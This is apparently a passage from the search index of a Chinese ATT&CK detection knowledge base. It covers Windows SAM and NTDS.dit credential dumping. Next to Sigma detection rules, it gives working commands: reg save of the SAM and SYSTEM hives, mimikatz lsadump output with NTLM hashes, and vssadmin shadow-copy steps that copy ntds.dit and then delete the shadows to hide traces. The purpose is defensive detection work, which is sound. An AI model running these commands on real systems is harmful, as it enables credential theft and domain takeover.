\u5b89\u5168\u5e10\u6237\u7ba1\u7406\u5668\uff08SAM\uff09\uff0c\u5f80\u5f80\u662f\u4e00\u4e2a\u6570\u636e\u5e93\u6587\u4ef6\u5728Windows XP\u4e2d\uff0cWindows Vista\u4e2d\u3001Windows 7\u4e2d\u30018.1\u548c10\u5b58\u50a8\u7528\u6237\u7684\u5bc6\u7801\u3002\u5b83\u53ef\u7528\u4e8e\u9a8c\u8bc1\u672c\u5730\u548c\u8fdc\u7a0b\u7528\u6237\u3002\u4eceWindows 2000 SP4\u5f00\u59cb\uff0cActive Directory\u5bf9\u8fdc\u7a0b\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002SAM\u4f7f\u7528\u52a0\u5bc6\u63aa\u65bd\u6765\u9632\u6b62\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u8bbf\u95ee\u7cfb\u7edf\u3002 \u7528\u6237\u5bc6\u7801\u4ee5\u6563\u5217\u683c\u5f0f\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u4e2d\uff0c\u53ef\u4ee5\u662fLM\u54c8\u5e0c\uff0c\u4e5f\u53ef\u4ee5\u662fNTLM\u54c8\u5e0c\u3002\u53ef\u4ee5\u5728\u6b64\u6587\u4ef6\u4e2d\u627e\u5230%SystemRoot%/system32/config/SAM\u5e76\u5b89\u88c5\u6b64\u6587\u4ef6HKLM/SAM\u3002LM\u54c8\u5e0c\u662f\u4e00\u79cd\u53d7\u635f\u7684\u534f\u8bae\uff0c\u5df2\u88abNTLM\u54c8\u5e0c\u53d6\u4ee3\u3002\u53ef\u4ee5\u5c06\u5927\u591a\u6570Windows\u7248\u672c\u914d\u7f6e\u4e3a\u5728\u7528\u6237\u66f4\u6539\u5bc6\u7801\u65f6\u7981\u7528\u6709\u6548LM\u54c8\u5e0c\u7684\u521b\u5efa\u548c\u5b58\u50a8\u3002Windows Vista\u548c\u66f4\u9ad8\u7248\u672c\u7684Windows\u9ed8\u8ba4\u7981\u7528LM\u54c8\u5e0c\u3002 \u4e3a\u4e86\u63d0\u9ad8SAM\u6570\u636e\u5e93\u7684\u5b89\u5168\u6027\u4ee5\u9632\u6b62\u8131\u673a\u79bb\u7ebf\u7834\u89e3\uff0cMicrosoft\u5728Windows NT 4.0\u4e2d\u5f15\u5165\u4e86SYSKEY\u529f\u80fd\u3002\u542f\u7528SYSKEY\u540e\uff0cSAM\u6587\u4ef6\u7684\u78c1\u76d8\u526f\u672c\u5c06\u90e8\u5206\u52a0\u5bc6\uff0c\u4ee5\u4fbfSAM\u4e2d\u5b58\u50a8\u7684\u6240\u6709\u672c\u5730\u5e10\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u90fd\u4f7f\u7528\u5bc6\u94a5\u52a0\u5bc6\uff08\u901a\u5e38\u4e5f\u79f0\u4e3a\u201cSYSKEY\u201d\uff09\u3002\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c\u7a0b\u5e8f\u542f\u7528\u5b83\u3002","title":"SAM\uff08Security Accounts Manager\uff09"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u8fdb\u884c\u68c0\u7d22\u8bfb\u53d6SAM\u6587\u4ef6\uff1a pwdump.exe Mimikatz gsecdump \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528Reg\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6SAM\u6587\u4ef6\u4fe1\u606f\uff1a reg save HKLM\\SYSTEM SystemBkup.hiv reg save HKLM\\SAM SamBkup.hiv \u7136\u540e\u53ef\u4ee5\u4f7f\u7528Creddump7\u6216\u8005hashcat\u5728\u672c\u5730\u79bb\u7ebf\u63d0\u53d6\u54c8\u5e0c\u503c\u3002 \u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u5907\u4efd\u8fd9\u4e9b\u6587\u4ef6\uff1a C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SAM \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aRid 500\u8d26\u6237\u662f\u672c\u5730\u5185\u7f6e\u8d26\u6237\uff0cRid 501\u662f\u6765\u5bbe\u7528\u6237\uff0c\u7528\u6237\u8d26\u6237\u4ee5Rid 1000+\u5f00\u5934\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#samsystemhashadministrator","text":"C:\\Users\\me\\Desktop>reg save hklm\\sam sam.hiv The operation completed successfully. C:\\Users\\me\\Desktop>reg save hklm\\system system.hiv The operation completed successfully. mimikatz # lsadump::sam /sam:sam.hiv /system:system.hiv RID : 000001f4 (500) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 (501) User : Guest RID : 000003eb (1003) User : test Hash NTLM: a2345375a47a92754e2505132aca194b RID : 000003ec (1004) User : test2 Hash NTLM: f0873f3268072c7b1150b15670291137","title":"\u653b\u51fb\u65b9\u6cd5\uff1a\u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator)"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"\u653b\u51fb\u65b9\u6cd5\uff1a\u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator)\u00b7 title: \u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator) description: windows 7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump tags: ATT&CK T1003-002 status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: sysmon detection: \u200b selection1: \u200b EventID: 1 \u200b Image: 'C:\\Windows\\System32\\reg.exe' \u200b CommandLine: 'reg save hklm\\sam *.hiv' \u200b selection2: \u200b EventID: 1 \u200b Image: 'Image: C:\\Windows\\System32\\reg.exe' \u200b CommandLine: 'reg save hklm\\system *.hiv' \u200b timeframe: last 2m \u200b condition: all of them level: high","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"MITRE-ATT&CK-T1003-002 https://attack.mitre.org/techniques/T1003/002 pwdump7 http://passwords.openwall.net/b/pwdump/pwdump7.zip powershell https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1 mimikatz wiki https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump \u5173\u4e8e\u66f4\u591a\u901a\u8fc7SAM\u6570\u636e\u5e93\u83b7\u53d6\u672c\u5730\u7528\u6237hash\u4f60\u4e5f\u53ef\u4ee5\u53c2\u8003 https://www.4hou.com/technology/10878.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u83b7\u53d61 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c NTDS.dit Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b \u901a\u8fc7\u63d0\u53d6\u8fd9\u4e9b\u54c8\u5e0c\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982 Mimikatz\u4e4b\u7c7b\u7684 \u5de5\u5177\u6765\u6267\u884c\u4f20\u9012\u54c8\u5e0c\u653b\u51fb\uff0c\u6216\u8005\u4f7f\u7528\u50cf Hashcat \u8fd9\u6837\u7684\u5de5\u5177\u6765\u7834\u89e3\u8fd9\u4e9b\u5bc6\u7801\u3002\u8fd9\u4e9b\u5bc6\u7801\u7684\u63d0\u53d6\u548c\u7834\u89e3\u53ef\u4ee5\u79bb\u7ebf\u6267\u884c\uff0c\u56e0\u6b64\u65e0\u6cd5\u68c0\u6d4b\u5230\u3002\u4e00\u65e6\u653b\u51fb\u8005\u63d0\u53d6\u4e86\u8fd9\u4e9b\u54c8\u5e0c\u503c\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u5145\u5f53\u57df\u4e2d\u7684\u4efb\u4f55\u7528\u6237\uff0c\u5305\u62ec\u57df\u7ba1\u7406\u5458\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u548c\u6280\u672f\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\uff1a \u4f7f\u7528 NTDSUtil \u521b\u5efa IFM \u6293\u53d6 DC \u672c\u5730\u7684 Ntds.dit \u6587\u4ef6\u3002 \u4f7f\u7528 VSS \u5377\u5f71\u590d\u5236\u8fdc\u7a0b\u8bfb\u53d6 Ntds.dit\u3002 \u4f7f\u7528 PowerSploit \u7684 Invoke-NinjaCopy \u8fdc\u7a0b\u8bfb\u53d6 Ntds.dit\uff08\u9700\u8981\u76ee\u6807 DC \u542f\u7528 PowerShell \u8fdc\u7a0b\u7ba1\u7406\uff09\u3002 \u5728 DC \u4e2d\u4f7f\u7528 Mimikatz \u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u5728 DC \u4e2d\u4f7f\u7528 Invoke-Mimikatz \u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u4f7f\u7528 Invoke-Mimikatz \u8fdc\u7a0b\u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u4f7f\u7528 Mimikatz \u7684 DCSync \u529f\u80fd\u8fdc\u7a0b\u8f6c\u50a8 Active Directory \u51ed\u636e\u3002 \u6ce8\u610f\uff1a\u5982\u679c\u5df2\u7ecf\u53d1\u73b0\u4e86 Active Directory \u6570\u636e\u5e93\uff08NTDS.DIT\uff09\u7684\u526f\u672c\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u65e0\u9700\u63d0\u5347\u6743\u9650\u5373\u53ef\u4ece\u4e2d\u8f6c\u50a8\u51ed\u636e\u3002 \u8c01\u53ef\u4ee5\u8bbf\u95ee\uff1f Enterprise Admins (\u76ee\u5f55\u6797\u7ba1\u7406\u5458\u7ec4) Domain Admins(\u57df\u7ba1\u7406\u5458\u7ec4) Administrators(\u7ba1\u7406\u5458\u7ec4) Backup Operators(\u5907\u4efd\u64cd\u4f5c\u6210\u5458) Account Operators(\u8d26\u6237\u7ba1\u7406\u7ec4) Print Operators(\u6253\u5370\u673a\u64cd\u4f5c\u7ec4) \u68c0\u6d4b\u65e5\u5fd7 windows sysmon\u65e5\u5fd7 Invoke-NinjaCopy -Path \u201cc:\\windows\\ntds\\ntds.dit\u201d -LocalDestination \u201cc:\\windows\\temp\\ntds.dit\u201c \u6d4b\u8bd5\u590d\u73b0 \u4e00\u65e6\u6211\u4eec\u83b7\u5f97\u4e86\u57df\u7ba1\u7406\u8bbf\u95ee\u6743\uff0c\u4ece DC \u4e2d\u63d0\u53d6\u6240\u6709\u54c8\u5e0c\u7684\u8001\u65b9\u6cd5\u5c31\u662f\u5728\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884c\u547d\u4ee4\uff0c\u5e76\u4f7f\u7528 Shadow Volume \u6216\u539f\u59cb\u62f7\u8d1d\u6280\u672f\u63d0\u53d6 ntds.dit \u6587\u4ef6\u3002 \u78c1\u76d8\u5377\u5f71\u590d\u5236\u6280\u672f \u7531\u4e8e\u6211\u4eec\u786e\u5b9e\u53ef\u4ee5\u8bbf\u95ee\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f5c\u4e3a\u653b\u51fb\u8005\u5728\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884c\u547d\u4ee4\uff0c\u56e0\u6b64\u6211\u4eec\u5e0c\u671b\u83b7\u53d6\u5b58\u50a8\u5728 ntds.dit \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u57df\u5185\u54c8\u5e0c\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u8be5\u6587\u4ef6\u4e0d\u65ad\u5730\u88ab\u8bfb\u548c\u5199\uff0c\u5373\u4f7f\u4f5c\u4e3a\u7cfb\u7edf\uff0c\u6211\u4eec\u4e5f\u65e0\u6cd5\u8bfb\u53d6\u6216\u590d\u5236\u8be5\u6587\u4ef6\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u540d\u4e3a Volume Shadow Copy Service \u78c1\u76d8\u590d\u5236\u670d\u52a1\uff08VSS\uff09\u7684 Windows \u529f\u80fd\uff0c\u8be5\u529f\u80fd\u5c06\u521b\u5efa\u78c1\u76d8\u7684\u5feb\u7167\u526f\u672c\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4ece\u8be5\u526f\u672c\u4e2d\u8bfb\u53d6 Ntds.dit \u6587\u4ef6\u5c06\u5176\u83b7\u53d6\u51fa\u6765\u3002\u5e76\u5c06\u5176\u4ece\u8ba1\u7b97\u673a\u4e0a\u53d6\u6d88\uff0c\u8fd9\u5305\u62ec\u7a83\u53d6 Ntds.dit\u3001System\u3001SAM \u548c Boot Key \u6587\u4ef6\u3002\u6700\u540e\uff0c\u6211\u4eec\u9700\u8981\u6e05\u7406\u6211\u4eec\u7684\u884c\u8e2a\u5e76\u5220\u9664\u78c1\u76d8\u62f7\u8d1d\uff1a - C:\\vssadmin create shadow /for=C: - copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SYSTEM - copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SAM - copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\ntds\\ntds.dit - reg SAVE HKLM\\SYSTEM c:\\SYS - vssadmin list shadows - vssadmin delete shadows /for= [/oldest | /all | /shadow=] \u6d4b\u8bd5\u7559\u75d5 windows sysmon\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\u3001\u547d\u4ee4\u884c\u53c2\u6570 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: VSS\u5377\u5f71\u590d\u5236\u672c\u5730\u8bfb\u53d6Ntds.dit\u6587\u4ef6(\u57df\u63a7\u4e3b\u673a\u64cd\u4f5c\uff0c\u4e5f\u9002\u7528\u4e8eVSS\u5377\u5f71\u590d\u5236\u8fdc\u7a0b\u8bfb\u53d6Ntds.dit\u6587\u4ef6) description: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://1sparrow.com/2018/02/19/\u57df\u6e17\u900f\u76f8\u5173/ tags: T1003-003 status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection1: EventID: 1 # \u8fdb\u7a0b\u521b\u5efa Image: 'C:\\Windows\\System32\\vssadmin.exe' CommandLine: 'VSSADMIN.EXE' CurrentDirectory: 'vssadmin create shadow /for=C:' selection2: EventID: 1 Image: 'C:\\Windows\\System32\\reg.exe' CommandLine: 'reg.exe' CurrentDirectory: 'reg SAVE HKLM\\SYSTEM *' selection3: EventID: 1 # \u8fdb\u7a0b\u521b\u5efa Image: 'C:\\Windows\\System32\\vssadmin.exe' CommandLine: 'VSSADMIN.EXE' CurrentDirectory: 'vssadmin delete shadows /all' condition: selection1 or selection2 or selection3 level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 \u4ece\u6d3b\u52a8\u76ee\u5f55\u4e2d\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u76846\u79cd\u65b9\u6cd5 https://www.4hou.com/technology/4256.html \u5982\u4f55\u5de7\u5999\u7684\u4ecentds.dit\u4e2d\u63d0\u53d6Hash\u548c\u57df\u4fe1\u606f https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/ \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 \u4eceNTDS.dit\u83b7\u53d6\u5bc6\u7801hash\u7684\u4e09\u79cd\u65b9\u6cd5 https://www.freebuf.com/sectool/176876.html \u4eceNTDS.dit\u6587\u4ef6\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c\u503c https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/ \u653b\u51fb\u8005\u5982\u4f55\u8f6c\u50a8AD\u6570\u636e\u5e93\u51ed\u636e https://adsecurity.org/?p=2398 \u5728AD\u4e2d\u83b7\u5f97\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u653b\u51fb\u65b9\u6cd5 https://adsecurity.org/?p=2362 \u5f3a\u529b\u63a8\u8350 \u8f6c\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u65b9\u6cd5\u603b\u7ed3 http://ju.outofmemory.cn/entry/232676 powershell\u5f00\u542f\u8fdc\u7a0b\u7ba1\u7406\u7684\u65b9\u6cd5\u8bf7\u53c2\u8003 https://blog.51cto.com/1163739403/1826546 \u5377\u5f71\u590d\u5236NTDS.dit\u57df\u6563\u5217\u8fdc\u7a0b-\u7b2c1\u90e8\u5206 https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/ \u4eceNTDS.dit\u6587\u4ef6\u83b7\u53d6\u54c8\u5e0c https://www.swordshield.com/blog/getting-hashes-from-ntds-dit-file/ \u8f6c\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u51ed\u8bc1\u7684\u65b9\u6cd5\u603b\u7ed3 https://blog.csdn.net/weixin_33713707/article/details/87980463","title":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u83b7\u53d61"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1003-003-windows-ntds1","text":"","title":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u83b7\u53d61"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#ntdsdit","text":"Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002","title":"NTDS.dit"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"\u901a\u8fc7\u63d0\u53d6\u8fd9\u4e9b\u54c8\u5e0c\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982 Mimikatz\u4e4b\u7c7b\u7684 \u5de5\u5177\u6765\u6267\u884c\u4f20\u9012\u54c8\u5e0c\u653b\u51fb\uff0c\u6216\u8005\u4f7f\u7528\u50cf Hashcat \u8fd9\u6837\u7684\u5de5\u5177\u6765\u7834\u89e3\u8fd9\u4e9b\u5bc6\u7801\u3002\u8fd9\u4e9b\u5bc6\u7801\u7684\u63d0\u53d6\u548c\u7834\u89e3\u53ef\u4ee5\u79bb\u7ebf\u6267\u884c\uff0c\u56e0\u6b64\u65e0\u6cd5\u68c0\u6d4b\u5230\u3002\u4e00\u65e6\u653b\u51fb\u8005\u63d0\u53d6\u4e86\u8fd9\u4e9b\u54c8\u5e0c\u503c\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u5145\u5f53\u57df\u4e2d\u7684\u4efb\u4f55\u7528\u6237\uff0c\u5305\u62ec\u57df\u7ba1\u7406\u5458\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u548c\u6280\u672f\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive 